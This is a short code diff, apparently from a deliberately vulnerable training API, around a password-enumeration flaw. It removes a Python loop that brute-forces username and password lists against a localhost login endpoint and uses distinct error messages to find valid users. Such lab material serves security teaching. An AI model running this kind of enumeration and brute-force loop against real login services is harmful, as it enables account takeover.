@@ -14,18 +14,3 @@ if vuln:  # Password Enumeration
 else:
     if (user and request_data.get('password') != user.password) or (not user):
         return Response(error_message_helper("Username or Password Incorrect!"), 200, mimetype="application/json")
-
-for user in users_list:
-    for password in pass_list:
-        data = {
-            "username": user,
-            "password": password
-        }
-        response = requests.post("http://localhost:5000/users/v1/login", json=data)
-        body = response.json()
-        if body["message"] == password_error_message:
-            print(f"User {user} does exist, checking passwords")
-        elif body["message"] == "Successfully logged in.":
-            print(f"Found {user} with password {password}")
-        else:
-            break
